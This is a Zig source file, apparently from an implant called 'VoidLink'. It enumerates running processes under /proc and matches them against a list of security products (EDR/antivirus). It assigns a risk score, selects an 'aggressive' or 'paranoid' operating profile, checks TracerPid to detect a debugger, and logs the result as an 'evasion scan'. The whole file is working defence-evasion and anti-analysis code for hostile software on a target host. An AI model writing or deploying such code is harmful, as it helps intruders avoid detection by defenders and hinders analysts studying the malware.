//! Security product enumeration — scan /proc for EDR/AV processes.
//! VoidLink profiles the target host to select timing profiles.
const std = @import("std");
const config = @import("config.zig");

pub const ScanResult = struct {
    edr_detected: bool,
    product_count: u32,
    risk_score: u8, // 0-100
    recommended_profile: config.Profile,
    product_names: [16][]const u8,
    product_names_len: u8,
};

/// Scan /proc for running security products.
/// Uses std.fs to iterate /proc entries and read comm files.
pub fn scanForEDR() ScanResult {
    var result = ScanResult{
        .edr_detected = false,
        .product_count = 0,
        .risk_score = 0,
        .recommended_profile = config.PROFILE_AGGRESSIVE,
        .product_names = .{""} ** 16,
        .product_names_len = 0,
    };

    var proc_dir = std.fs.openDirAbsolute("/proc", .{ .iterate = true }) catch {
        config.jsonLog("warn", "evasion_scan_failed", "\"reason\":\"cannot open /proc\"");
        return result;
    };
    defer proc_dir.close();

    var iter = proc_dir.iterate();
    while (iter.next() catch null) |entry| {
        // Only look at numeric directories (PIDs)
        if (!isNumeric(entry.name)) continue;

        // Read /proc/<pid>/comm
        var path_buf: [64]u8 = undefined;
        const comm_path = std.fmt.bufPrint(&path_buf, "{s}/comm", .{entry.name}) catch continue;

        const comm_file = proc_dir.openFile(comm_path, .{}) catch continue;
        defer comm_file.close();

        var comm_buf: [256]u8 = undefined;
        const bytes_read = comm_file.read(&comm_buf) catch continue;
        if (bytes_read == 0) continue;

        // Strip trailing newline
        var comm = comm_buf[0..bytes_read];
        if (comm.len > 0 and comm[comm.len - 1] == '\n') {
            comm = comm[0 .. comm.len - 1];
        }

        // Check against known security products
        for (config.SECURITY_PRODUCTS) |product| {
            if (std.mem.indexOf(u8, comm, product) != null) {
                result.edr_detected = true;
                result.product_count += 1;
                if (result.product_names_len < 16) {
                    result.product_names[result.product_names_len] = product;
                    result.product_names_len += 1;
                }
                break;
            }
        }
    }

    // Calculate risk score and select profile
    if (result.product_count == 0) {
        result.risk_score = 0;
        result.recommended_profile = config.PROFILE_AGGRESSIVE;
    } else if (result.product_count <= 2) {
        result.risk_score = 50;
        result.recommended_profile = config.PROFILE_PARANOID;
    } else {
        result.risk_score = 90;
        result.recommended_profile = config.PROFILE_PARANOID;
    }

    return result;
}

/// Check if TracerPid != 0 in /proc/self/status (debugger detection).
pub fn checkDebugger() bool {
    const status_file = std.fs.openFileAbsolute("/proc/self/status", .{}) catch return false;
    defer status_file.close();

    var buf: [4096]u8 = undefined;
    const n = status_file.read(&buf) catch return false;
    const content = buf[0..n];

    // Look for "TracerPid:\t<N>" where N != 0
    if (std.mem.indexOf(u8, content, "TracerPid:")) |pos| {
        var i = pos + "TracerPid:".len;
        // Skip whitespace/tabs
        while (i < content.len and (content[i] == '\t' or content[i] == ' ')) : (i += 1) {}
        // If first digit is not '0' or there are more digits, debugger is attached
        if (i < content.len and content[i] != '0') return true;
        if (i + 1 < content.len and content[i + 1] >= '0' and content[i + 1] <= '9') return true;
    }
    return false;
}

/// Log evasion scan results.
pub fn logScanResult(result: *const ScanResult) void {
    var buf: [256]u8 = undefined;
    const extra = std.fmt.bufPrint(&buf,
        \\"products_found":{d},"risk_score":{d},"profile":"{s}","edr_detected":{s}
    , .{
        result.product_count,
        result.risk_score,
        result.recommended_profile.mode,
        if (result.edr_detected) "true" else "false",
    }) catch return;
    config.jsonLog("info", "evasion_scan", extra);
}

fn isNumeric(s: []const u8) bool {
    if (s.len == 0) return false;
    for (s) |c| {
        if (c < '0' or c > '9') return false;
    }
    return true;
}
